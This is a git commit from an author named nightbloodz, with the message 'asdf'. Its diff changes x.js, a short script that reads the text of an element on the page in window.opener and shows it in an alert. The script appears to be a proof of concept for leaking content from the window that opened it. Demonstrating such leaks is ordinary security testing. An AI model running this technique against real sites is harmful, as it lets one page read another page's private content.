8d64447cc6c3d0369e77c51a81ef84770fe345dc
nightbloodz <alvarobalada73@gmail.com>
2023-07-11 17:19:13 +0200

    asdf

--- x.js
+++ x.js
@@ -1,13 +1,9 @@
-window.opener.onload = x => {
+var leakedData = window.opener.document.getElementsByClassName("section--2")[0].innerText
+alert(leakedData)
 
 
 
-    var leakedData = window.opener.document.getElementsByClassName("section--2")[0].innerText
-    alert(leakedData)
 
-
-
-}
 
 
 
